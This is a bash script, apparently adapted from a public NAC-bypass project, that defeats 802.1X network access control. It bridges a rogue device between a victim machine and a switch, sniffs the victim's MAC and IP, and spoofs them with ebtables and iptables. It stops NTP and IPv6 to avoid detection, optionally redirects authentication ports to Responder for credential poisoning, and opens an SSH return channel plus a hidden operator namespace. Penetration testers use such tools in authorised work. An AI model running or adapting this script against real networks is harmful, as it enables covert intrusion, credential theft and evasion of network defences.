#!/bin/bash
if [[ $EUID -ne 0 ]]; then
  echo "[!] This script must be run as root."
  exit 1
fi

# -----------------------------------------------------------------------------
# Based on: https://github.com/scipag/nac_bypass
# Adjustments to the original script:
#   - Fine-tuned connection messages to indicate cable order and reduce
#     unknown MAC alerts when connecting client and switch.
#   - Creation of an isolated "bypass" namespace with dedicated macvlan after connection_phase,
#     isolating operator traffic.
#   - Extended cleanup routine to remove namespace, macvlan and auxiliary files,
#     facilitating repeated executions without residue.
# -----------------------------------------------------------------------------

# --- Configuration variables --------------------------------------------
VERSION="0.6.5-1715949302"

CMD_ARP_TABLES=/usr/sbin/arptables
CMD_EB_TABLES=/usr/sbin/ebtables
CMD_IP_TABLES=/usr/sbin/iptables

# Color palette for readable terminal messages.
COLOR_RESET="\e[0m" # reset text
COLOR_SUCCESS="\e[1;32m" # green
COLOR_INFO="\e[1;34m" # blue
COLOR_WARN="\e[1;31m" # red
COLOR_PROMPT="\e[1;36m" # cyan

BRIDGE_INTERFACE=br0 # bridge interface
SWITCH_INTERFACE=eth0 # network interface connected to switch
SWITCH_MAC=00:11:22:33:44:55 # initial value, set during initialization
CLIENT_INTERFACE=eth1 # network interface connected to victim machine

BRIDGE_IP=169.254.66.66 # IP address for bridge
BRIDGE_GATEWAY=169.254.66.1 # gateway IP address for bridge

CAPTURE_FILE=/tmp/tcpdump.pcap
OPTION_RESPONDER=0        # Activates port redirection for Responder
OPTION_SSH=0              # Enables redirection and OpenSSH startup
OPTION_AUTONOMOUS=0         # Suppresses manual interaction and extra messages
OPTION_CONNECTION_ONLY=0    # Executes only the second bypass phase
OPTION_INITIAL_ONLY=0     # Executes only the initial phase
OPTION_RESET=0         # Resets environment and exits

# Ports of interest analyzed during initial capture.
TCPDUMP_PORT_1=88
TCPDUMP_PORT_2=445

# Ports Responder typically needs for poisoning and authentication.
UDP_NETBIOS_NS_PORT=137
UDP_NETBIOS_DS_PORT=138
UDP_DNS_PORT=53
UDP_LDAP_PORT=389
TCP_LDAP_PORT=389
TCP_SQL_PORT=1433
UDP_SQL_PORT=1434
TCP_HTTP_PORT=80
TCP_HTTPS_PORT=443
TCP_SMB_PORT=445
TCP_NETBIOS_SS_PORT=139
TCP_FTP_PORT=21
TCP_SMTP1_PORT=25
TCP_SMTP2_PORT=587
TCP_POP3_PORT=110
TCP_IMAP_PORT=143
TCP_PROXY_PORT=3128
UDP_MULTICAST_PORT=5553

SSH_RETURN_PORT=50222 # SSH return port uses victimip:50022 to connect attackerbox:sshport
SSH_PORT=50022
NAT_PORT_RANGE=61000-62000 # ports for my traffic in NAT

# --- Utility functions --------------------------------------------------
show_help() {
  echo -e "$0 v$VERSION usage:"
  echo "    -1 <eth>    network interface connected to switch"
  echo "    -2 <eth>    network interface connected to victim machine"
  echo "    -a          autonomous mode"
  echo "    -c          start only connection configuration"
  echo "    -g <MAC>    manually set gateway MAC address (GATEWAY_MAC)"
  echo "    -h          shows this help"
  echo "    -i          start only initial configuration"
  echo "    -r          reset all settings"
  echo "    -R          enable port redirection for Responder"
  echo "    -S          enable port redirection for OpenSSH and start service"
  exit 0
}

## show version information
show_version() {
  echo -e "$0 v$VERSION"
  exit 0
}

# Analyzes received parameters and adjusts execution flags.
parse_arguments() {
  while getopts ":1:2:acg:hirRS" option; do
    case "$option" in
      1)
        SWITCH_INTERFACE=$OPTARG
        ;;
      2)
        CLIENT_INTERFACE=$OPTARG
        ;;
      a)
        OPTION_AUTONOMOUS=1
        ;;
      c)
        OPTION_CONNECTION_ONLY=1
        ;;
      g)
        GATEWAY_MAC=$OPTARG
        ;;
      h)
        show_help
        ;;
      i)
        OPTION_INITIAL_ONLY=1
        ;;
      r)
        OPTION_RESET=1
        ;;
      R)
        OPTION_RESPONDER=1
        ;;
      S)
        OPTION_SSH=1
        ;;
      *)
        OPTION_RESPONDER=0
        OPTION_SSH=0
        OPTION_AUTONOMOUS=0
        ;;
    esac
  done
}

# --- Phase 1: Prepare bridge infrastructure -------------------------
initial_phase() {
  if [[ "$OPTION_AUTONOMOUS" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Starting NAC bypass procedure.$COLOR_RESET"
    echo
  fi

  if [[ "$OPTION_AUTONOMOUS" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Executing preparation tasks.$COLOR_RESET"
    echo
  fi

  systemctl stop NetworkManager.service
  cp /etc/sysctl.conf /etc/sysctl.conf.bak
  echo "net.ipv6.conf.all.disable_ipv6 = 1" > /etc/sysctl.conf
  sysctl -p
  echo "" > /etc/resolv.conf

  # Disable multicast on both interfaces so network doesn't receive initial IGMP.
  ip link set "$SWITCH_INTERFACE" multicast off
  ip link set "$CLIENT_INTERFACE" multicast off

  # Pause common NTP services; any automatic synchronization can reveal presence.
  declare -a NTP_SERVICES=("ntp.service" "ntpsec.service" "chronyd.service" "systemd-timesyncd.service")
  for SERVICE in "${NTP_SERVICES[@]}"; do
    SERVICE_STATE=$(systemctl is-active "$SERVICE")
    if [[ $SERVICE_STATE == "active" ]]; then
      systemctl stop "$SERVICE"
    fi
  done
  timedatectl set-ntp false

  # Automatically get physical MAC address of port towards switch.
  SWITCH_MAC=$(ifconfig "$SWITCH_INTERFACE" | grep -i ether | awk '{ print $2 }')

  if [[ "$OPTION_AUTONOMOUS" -eq 0 ]]; then
    echo
    echo -e "$COLOR_SUCCESS [ + ] Preparation completed.$COLOR_RESET"
    echo
  fi

  if [[ "$OPTION_AUTONOMOUS" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Configuring main bridge.$COLOR_RESET"
    echo
  fi

  brctl addbr "$BRIDGE_INTERFACE"                              # create virtual bridge
  brctl addif "$BRIDGE_INTERFACE" "$CLIENT_INTERFACE"          # add client interface
  brctl addif "$BRIDGE_INTERFACE" "$SWITCH_INTERFACE"          # add interface towards switch

  echo 8 > "/sys/class/net/${BRIDGE_INTERFACE}/bridge/group_fwd_mask"            # forward EAP frames for 802.1X
  echo 1 > /proc/sys/net/bridge/bridge-nf-call-iptables

  ifconfig "$CLIENT_INTERFACE" 0.0.0.0 up promisc              # bring up client interface in promiscuous mode
  ifconfig "$SWITCH_INTERFACE" 0.0.0.0 up promisc              # bring up switch interface in promiscuous mode

  macchanger -m 00:12:34:56:78:90 "$BRIDGE_INTERFACE"          # initial neutral value
  macchanger -m "$SWITCH_MAC" "$BRIDGE_INTERFACE"              # spoof MAC from switch side

  ifconfig "$BRIDGE_INTERFACE" 0.0.0.0 up promisc

  if [[ "$OPTION_AUTONOMOUS" -eq 0 ]]; then
    echo
    echo -e "$COLOR_SUCCESS [ + ] Bridge initialized in passive mode.$COLOR_RESET"
    echo
    echo -e "$COLOR_PROMPT [ # ] Recommended order: connect $CLIENT_INTERFACE to client and then $SWITCH_INTERFACE to switch.$COLOR_RESET"
    echo -e "$COLOR_PROMPT [ # ] Check link and LED activity on both interfaces before continuing.$COLOR_RESET"
    echo -e "$COLOR_PROMPT [ # ] Wait ~30 seconds for link negotiation and press any key to proceed.$COLOR_RESET"
    echo -e "$COLOR_WARN [ ! ] Confirm target machine maintains connectivity before advancing.$COLOR_RESET"
    echo -e "$COLOR_INFO [ * ] Monitoring EAPOL frames on $CLIENT_INTERFACE to validate authentication.$COLOR_RESET"
    echo -e "$COLOR_PROMPT [ # ] Press any key to stop monitoring and continue.$COLOR_RESET"

    local EAPOL_MONITOR_PID=""
    local TCPDUMP_MONITOR_ARGS=(-i "$CLIENT_INTERFACE" -l -nn -e -vvv -s0 -tttt ether proto 0x888e)
    trap '[[ -n "$EAPOL_MONITOR_PID" ]] && kill -INT "$EAPOL_MONITOR_PID" 2>/dev/null' INT TERM
    tcpdump "${TCPDUMP_MONITOR_ARGS[@]}" &
    EAPOL_MONITOR_PID=$!

    read -r -s -n1
    echo
    if kill -0 "$EAPOL_MONITOR_PID" 2>/dev/null; then
      kill -INT "$EAPOL_MONITOR_PID" 2>/dev/null
      wait "$EAPOL_MONITOR_PID" 2>/dev/null
    fi
    trap - INT TERM
  else
    sleep 25s
  fi
}

# --- Phase 2: Clone identity ----------------------
connection_phase() {

  if [[ "$OPTION_AUTONOMOUS" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Resetting links on $CLIENT_INTERFACE and $SWITCH_INTERFACE.$COLOR_RESET"
    echo -e "$COLOR_INFO [ * ] Restarting interfaces to force renegotiation in promiscuous mode.$COLOR_RESET"
    echo
  fi

  for IFACE in "$CLIENT_INTERFACE" "$SWITCH_INTERFACE"; do
    if ip link set "$IFACE" down 2>/dev/null; then
      [[ "$OPTION_AUTONOMOUS" -eq 0 ]] && echo -e "$COLOR_PROMPT [ # ] $IFACE has been successfully deactivated.$COLOR_RESET"
    else
      [[ "$OPTION_AUTONOMOUS" -eq 0 ]] && echo -e "$COLOR_WARN [ ! ] Could not deactivate $IFACE.$COLOR_RESET"
    fi
  done

  sleep 1

  for IFACE in "$CLIENT_INTERFACE" "$SWITCH_INTERFACE"; do
    if ip link set "$IFACE" up 2>/dev/null; then
      ip link set "$IFACE" promisc on 2>/dev/null
      local IFACE_STATE
      IFACE_STATE=$(cat "/sys/class/net/${IFACE}/operstate" 2>/dev/null)
      [[ "$OPTION_AUTONOMOUS" -eq 0 ]] && echo -e "$COLOR_SUCCESS [ + ] $IFACE active (status: ${IFACE_STATE:-unknown}).$COLOR_RESET"
    else
      [[ "$OPTION_AUTONOMOUS" -eq 0 ]] && echo -e "$COLOR_WARN [ ! ] Could not activate $IFACE.$COLOR_RESET"
    fi
  done

  if [[ "$OPTION_AUTONOMOUS" -eq 0 ]]; then
    echo
  fi

  if [[ "$OPTION_AUTONOMOUS" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Capturing initial TCP traffic.$COLOR_RESET"
    echo
  fi

  ## Capture PCAP and look for SYN packets from victim machine to get source IP, source MAC and gateway MAC
  # TODO: Replace this with tcp SYN OR (udp && no broadcast)? need to distinguish source and destination
  # TODO: Replace it by getting data directly from source interface?
  tcpdump -i "$CLIENT_INTERFACE" -s0 -w "$CAPTURE_FILE" -c1 'tcp[13] & 2 != 0'

  CLIENT_MAC=$(tcpdump -r "$CAPTURE_FILE" -nne -c 1 tcp | awk '{print $2","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $1}')
  if [[ -z "$GATEWAY_MAC" ]]; then
    GATEWAY_MAC=$(tcpdump -r "$CAPTURE_FILE" -nne -c 1 tcp | awk '{print $2","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $2}')
  fi
  CLIENT_IP=$(tcpdump -r "$CAPTURE_FILE" -nne -c 1 tcp | awk '{print $3","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $3}')
  if [[ "$OPTION_AUTONOMOUS" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Processing capture and updating parameters.$COLOR_RESET"
    echo -e "$COLOR_INFO [ * ] CLIENT_MAC: $CLIENT_MAC | GATEWAY_MAC: $GATEWAY_MAC | CLIENT_IP: $CLIENT_IP $COLOR_RESET"
    echo
  fi

  ## go silent
  $CMD_ARP_TABLES -A OUTPUT -o "$SWITCH_INTERFACE" -j DROP
  $CMD_ARP_TABLES -A OUTPUT -o "$CLIENT_INTERFACE" -j DROP
  $CMD_IP_TABLES -A OUTPUT -o "$CLIENT_INTERFACE" -j DROP
  $CMD_IP_TABLES -A OUTPUT -o "$SWITCH_INTERFACE" -j DROP

  if [[ "$OPTION_AUTONOMOUS" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Applying bridge IP, L2 translation and default route.$COLOR_RESET"
    echo
  fi
  ifconfig "$BRIDGE_INTERFACE" "$BRIDGE_IP" up promisc

  ## configure Layer 2 rewriting
  ## If script was called with -c, we need to find MAC of interface towards switch.
  if [[ "$OPTION_CONNECTION_ONLY" -eq 1 ]]; then
    SWITCH_MAC=$(ifconfig "$SWITCH_INTERFACE" | grep -i ether | awk '{ print $2 }')
  fi
  $CMD_EB_TABLES -t nat -A POSTROUTING -s "$SWITCH_MAC" -o "$SWITCH_INTERFACE" -j snat --to-src "$CLIENT_MAC"
  $CMD_EB_TABLES -t nat -A POSTROUTING -s "$SWITCH_MAC" -o "$BRIDGE_INTERFACE" -j snat --to-src "$CLIENT_MAC"

  ## create default routes to route traffic: all traffic goes to bridge gateway and is sent at Layer 2 to GATEWAY_MAC
  arp -s -i "$BRIDGE_INTERFACE" "$BRIDGE_GATEWAY" "$GATEWAY_MAC"
  route add default gw "$BRIDGE_GATEWAY" dev "$BRIDGE_INTERFACE" metric 10

  ## --- Flag-controlled redirection rules ---

  # SSH redirection (-S)
  if [[ "$OPTION_SSH" -eq 1 ]]; then
    if [[ "$OPTION_AUTONOMOUS" -eq 0 ]]; then
      echo
      echo -e "$COLOR_INFO [ * ] Enabling incoming SSH redirection on $CLIENT_IP:$SSH_RETURN_PORT and starting OpenSSH.$COLOR_RESET"
      echo
    fi
    $CMD_IP_TABLES -t nat -A PREROUTING -i "$BRIDGE_INTERFACE" -d "$CLIENT_IP" \
      -p tcp --dport "$SSH_RETURN_PORT" -j DNAT --to "$BRIDGE_IP:$SSH_PORT"

    systemctl start ssh.service 2>/dev/null || true
  fi

  # Responder redirection (-R)
  if [[ "$OPTION_RESPONDER" -eq 1 ]]; then
    if [[ "$OPTION_AUTONOMOUS" -eq 0 ]]; then
      echo
      echo -e "$COLOR_INFO [ * ] Enabling port redirection for Responder.$COLOR_RESET"
      echo
    fi

    RESPONDER_UDP_PORTS=($UDP_NETBIOS_NS_PORT $UDP_NETBIOS_DS_PORT $UDP_DNS_PORT \
                           $UDP_LDAP_PORT $UDP_SQL_PORT $UDP_MULTICAST_PORT)
    RESPONDER_TCP_PORTS=($TCP_LDAP_PORT $TCP_SQL_PORT $TCP_HTTP_PORT $TCP_HTTPS_PORT \
                           $TCP_SMB_PORT $TCP_NETBIOS_SS_PORT $TCP_FTP_PORT \
                           $TCP_SMTP1_PORT $TCP_SMTP2_PORT $TCP_POP3_PORT \
                           $TCP_IMAP_PORT $TCP_PROXY_PORT)

    for p in "${RESPONDER_UDP_PORTS[@]}"; do
      $CMD_IP_TABLES -t nat -A PREROUTING -i "$BRIDGE_INTERFACE" -d "$CLIENT_IP" \
        -p udp --dport "$p" -j DNAT --to "$BRIDGE_IP:$p"
    done
    for p in "${RESPONDER_TCP_PORTS[@]}"; do
      $CMD_IP_TABLES -t nat -A PREROUTING -i "$BRIDGE_INTERFACE" -d "$CLIENT_IP" \
        -p tcp --dport "$p" -j DNAT --to "$BRIDGE_IP:$p"
    done
  fi

  ## --- Controlled outgoing NAT ---
  # Only translate traffic originating from BRIDGE_IP (namespace), not entire host.
  $CMD_IP_TABLES -t nat -A POSTROUTING -o "$BRIDGE_INTERFACE" -s "$BRIDGE_IP" \
    -p tcp -j SNAT --to "$CLIENT_IP:$NAT_PORT_RANGE"
  $CMD_IP_TABLES -t nat -A POSTROUTING -o "$BRIDGE_INTERFACE" -s "$BRIDGE_IP" \
    -p udp -j SNAT --to "$CLIENT_IP:$NAT_PORT_RANGE"
  $CMD_IP_TABLES -t nat -A POSTROUTING -o "$BRIDGE_INTERFACE" -s "$BRIDGE_IP" \
    -p icmp -j SNAT --to "$CLIENT_IP"

  ## START SSH
  if [[ "$OPTION_SSH" -eq 1 ]]; then
    systemctl start ssh.service
  fi

  ## Finish
  if [[ "$OPTION_AUTONOMOUS" -eq 0 ]]; then
    echo
    echo -e "$COLOR_SUCCESS [ + ] Configuration finished. Validate connectivity and services before operating.$COLOR_RESET"
    echo
  fi

  ## Restore traffic flow; monitor ports for blocking
  $CMD_ARP_TABLES -D OUTPUT -o "$SWITCH_INTERFACE" -j DROP
  $CMD_ARP_TABLES -D OUTPUT -o "$CLIENT_INTERFACE" -j DROP
  $CMD_IP_TABLES -D OUTPUT -o "$CLIENT_INTERFACE" -j DROP
  $CMD_IP_TABLES -D OUTPUT -o "$SWITCH_INTERFACE" -j DROP

  ## Cleanup
  rm "$CAPTURE_FILE"

  ## Create isolated namespace and macvlan for operator
  if [[ "$OPTION_AUTONOMOUS" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Building isolated namespace \"bypass\" for controlled operations.$COLOR_RESET"
    echo
  fi

  local NS_NAME="bypass"
  local NS_INTERFACE="mv0"
  local NS_DIR="/etc/netns/${NS_NAME}"
  local NS_CLEANUP_CMD="ip netns delete ${NS_NAME}"
  local NS_RESOURCES_OK=1
  local NS_MISSING_CMDS=()
  local NS_IP_CIDR=""
  local NS_GATEWAY="$BRIDGE_GATEWAY"

  local NS_COMMANDS=("ip" "brctl" "macchanger" "tcpdump" "ebtables" "iptables")
  for CMD_NS in "${NS_COMMANDS[@]}"; do
    if ! command -v "$CMD_NS" >/dev/null 2>&1; then
      NS_MISSING_CMDS+=("$CMD_NS")
    fi
  done
  if ! ip netns list >/dev/null 2>&1; then
    NS_MISSING_CMDS+=("ip netns")
  fi

  if [[ ${#NS_MISSING_CMDS[@]} -gt 0 ]]; then
    echo -e "$COLOR_WARN [ ! ] Missing dependencies for namespace (${NS_MISSING_CMDS[*]}). Creation skipped, continuing with main flow.$COLOR_RESET"
    NS_RESOURCES_OK=0
  fi

  if [[ "$NS_RESOURCES_OK" -eq 1 ]]; then
    if ! ip link show "$BRIDGE_INTERFACE" >/dev/null 2>&1; then
      echo -e "$COLOR_WARN [ ! ] $BRIDGE_INTERFACE not available; macvlan $NS_INTERFACE will not be created.$COLOR_RESET"
      NS_RESOURCES_OK=0
    fi
  fi

  if [[ "$NS_RESOURCES_OK" -eq 1 ]]; then
    ip netns list | grep -qw "$NS_NAME" && ip netns delete "$NS_NAME"
    ip link show "$NS_INTERFACE" >/dev/null 2>&1 && ip link delete "$NS_INTERFACE"

    if ! ip netns add "$NS_NAME"; then
      echo -e "$COLOR_WARN [ ! ] Could not create namespace $NS_NAME.$COLOR_RESET"
      NS_RESOURCES_OK=0
    fi
  fi

  if [[ "$NS_RESOURCES_OK" -eq 1 ]]; then
    if ! ip link add "$NS_INTERFACE" link "$BRIDGE_INTERFACE" type macvlan mode bridge 2>/dev/null; then
      echo -e "$COLOR_WARN [ ! ] Could not create macvlan $NS_INTERFACE on $BRIDGE_INTERFACE.$COLOR_RESET"
      ip netns delete "$NS_NAME" 2>/dev/null
      NS_RESOURCES_OK=0
    fi
  fi

  if [[ "$NS_RESOURCES_OK" -eq 1 ]]; then
    if [[ -n "$CLIENT_MAC" ]]; then
      ip link set "$NS_INTERFACE" address "$CLIENT_MAC" 2>/dev/null || echo -e "$COLOR_WARN [ ! ] Could not assign legitimate MAC to $NS_INTERFACE.$COLOR_RESET"
    else
      echo -e "$COLOR_WARN [ ! ] CLIENT_MAC not defined; $NS_INTERFACE will use default MAC.$COLOR_RESET"
    fi
    ip link set "$NS_INTERFACE" promisc on 2>/dev/null
    if ! ip link set "$NS_INTERFACE" netns "$NS_NAME" 2>/dev/null; then
      echo -e "$COLOR_WARN [ ! ] Could not move $NS_INTERFACE to namespace $NS_NAME.$COLOR_RESET"
      ip link delete "$NS_INTERFACE" 2>/dev/null
      ip netns delete "$NS_NAME" 2>/dev/null
      NS_RESOURCES_OK=0
    fi
  fi

  if [[ "$NS_RESOURCES_OK" -eq 1 ]]; then
    if ! ip netns exec "$NS_NAME" ip link set "$NS_INTERFACE" up 2>/dev/null; then
      echo -e "$COLOR_WARN [ ! ] Could not activate $NS_INTERFACE within namespace.$COLOR_RESET"
      NS_RESOURCES_OK=0
    fi
    if [[ -n "$CLIENT_IP" ]]; then
      if [[ "$CLIENT_IP" == */* ]]; then
        NS_IP_CIDR="$CLIENT_IP"
      elif [[ -n "${CLIENT_IP_PREFIX:-}" ]]; then
        NS_IP_CIDR="${CLIENT_IP}/${CLIENT_IP_PREFIX}"
      else
        NS_IP_CIDR="${CLIENT_IP}/32"
      fi
      ip netns exec "$NS_NAME" ip addr flush dev "$NS_INTERFACE" scope global 2>/dev/null
      ip netns exec "$NS_NAME" ip addr add "$NS_IP_CIDR" dev "$NS_INTERFACE" 2>/dev/null || echo -e "$COLOR_WARN [ ! ] Could not assign client IP to $NS_INTERFACE.$COLOR_RESET"
    else
      echo -e "$COLOR_WARN [ ! ] CLIENT_IP not defined; namespace will lack its own addressing.$COLOR_RESET"
    fi

    if [[ -n "$NS_GATEWAY" ]]; then
      ip netns exec "$NS_NAME" ip route replace "$NS_GATEWAY"/32 dev "$NS_INTERFACE" scope link 2>/dev/null || true
      ip netns exec "$NS_NAME" ip route replace default via "$NS_GATEWAY" dev "$NS_INTERFACE" 2>/dev/null || echo -e "$COLOR_WARN [ ! ] Could not set default route within namespace.$COLOR_RESET"
      if [[ -n "$GATEWAY_MAC" ]]; then
        ip netns exec "$NS_NAME" arp -s "$NS_GATEWAY" "$GATEWAY_MAC" dev "$NS_INTERFACE" 2>/dev/null || true
      fi
    else
      echo -e "$COLOR_WARN [ ! ] BRIDGE_GATEWAY not defined; default route will not be configured in namespace.$COLOR_RESET"
    fi
  fi

  if [[ "$NS_RESOURCES_OK" -eq 1 ]]; then
    if mkdir -p "$NS_DIR"; then
      echo "nameserver 8.8.8.8" > "$NS_DIR/resolv.conf"
    else
      echo -e "$COLOR_WARN [ ! ] Could not prepare /etc/netns for namespace.$COLOR_RESET"
    fi
  fi

  if [[ "$NS_RESOURCES_OK" -eq 1 ]]; then
    # Prevent leaks only on bridge interfaces, without blocking host global traffic
    ebtables -t filter -C OUTPUT -o "$BRIDGE_INTERFACE" -s "$SWITCH_MAC" -j DROP 2>/dev/null || \
      ebtables -t filter -A OUTPUT -o "$BRIDGE_INTERFACE" -s "$SWITCH_MAC" -j DROP

    ip netns exec "$NS_NAME" ip -br addr show "$NS_INTERFACE" 2>/dev/null || true
    echo -e "$COLOR_SUCCESS [ + ] Namespace \"$NS_NAME\" available for operational use.$COLOR_RESET"
    echo -e "$COLOR_PROMPT [ # ] Interactive access: sudo ip netns exec $NS_NAME bash$COLOR_RESET"
    echo -e "$COLOR_PROMPT [ # ] Command execution: sudo ip netns exec $NS_NAME <command>$COLOR_RESET"
    echo -e "$COLOR_PROMPT [ # ] Network verification: sudo ip netns exec $NS_NAME ping -c1 <gateway_or_target>$COLOR_RESET"
    echo -e "$COLOR_PROMPT [ # ] Recommended cleanup: sudo $NS_CLEANUP_CMD$COLOR_RESET"
    echo -e "$COLOR_INFO [ * ] Use namespace exclusively for operational traffic.$COLOR_RESET"
  else
    echo -e "$COLOR_WARN [ ! ] Namespace not configured. Perform manual cleanup: sudo $NS_CLEANUP_CMD$COLOR_RESET"
  fi

  ## Ready
  if [[ "$OPTION_AUTONOMOUS" -eq 0 ]]; then
    echo
    echo -e "$COLOR_PROMPT [ * ] Configuration ready. Continue with planned actions.$COLOR_RESET"
    echo
  fi
}

# --- Complete cleanup routine -------------------------------------------
reset_configuration() {
  if [[ "$OPTION_AUTONOMOUS" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Starting complete restoration routine.$COLOR_RESET"
    echo
  fi

  ## bring down bridge
  ifconfig "$BRIDGE_INTERFACE" down
  brctl delbr "$BRIDGE_INTERFACE"

  ## remove default route
  arp -d -i "$BRIDGE_INTERFACE" "$BRIDGE_GATEWAY" "$GATEWAY_MAC"
  route del default dev "$BRIDGE_INTERFACE"

  # Flush EB, ARP and IPTABLES
  $CMD_EB_TABLES -F 2>/dev/null
  $CMD_EB_TABLES -t nat -F 2>/dev/null
  $CMD_ARP_TABLES -F 2>/dev/null
  $CMD_IP_TABLES -F 2>/dev/null
  $CMD_IP_TABLES -X 2>/dev/null
  $CMD_IP_TABLES -t nat -F 2>/dev/null
  $CMD_IP_TABLES -t nat -X 2>/dev/null

  # Restore sysctl.conf
  cp /etc/sysctl.conf.bak /etc/sysctl.conf
  rm /etc/sysctl.conf.bak
  sysctl -p

  if command -v ip >/dev/null 2>&1; then
    if ip netns list 2>/dev/null | grep -qw "bypass"; then
      ip netns delete bypass
    fi
    ip link delete mv0 2>/dev/null || true
  fi
  rm -rf /etc/netns/bypass 2>/dev/null || true

  if [[ "$OPTION_AUTONOMOUS" -eq 0 ]]; then
    echo
    echo -e "$COLOR_SUCCESS [ + ] Restoration finished. Environment returned to initial state.$COLOR_RESET"
    echo
  fi
}

# --- Entry point ------------------------------------------------------
parse_arguments "$@"

if [[ "$OPTION_RESET" -eq 0 && "$OPTION_INITIAL_ONLY" -eq 0 && "$OPTION_CONNECTION_ONLY" -eq 0 ]]; then
  echo -e "$COLOR_INFO [ * ] Confirm switch cable is disconnected before continuing.$COLOR_RESET"
  read -r -p "[?] Press ENTER when switch connection is disconnected." _
fi

if [[ "$OPTION_RESET" -eq 1 ]]; then
  reset_configuration
  exit 0
fi

if [[ "$OPTION_INITIAL_ONLY" -eq 1 ]]; then
  initial_phase
  exit 0
fi

if [[ "$OPTION_CONNECTION_ONLY" -eq 1 ]]; then
  connection_phase
  exit 0
fi

initial_phase
connection_phase
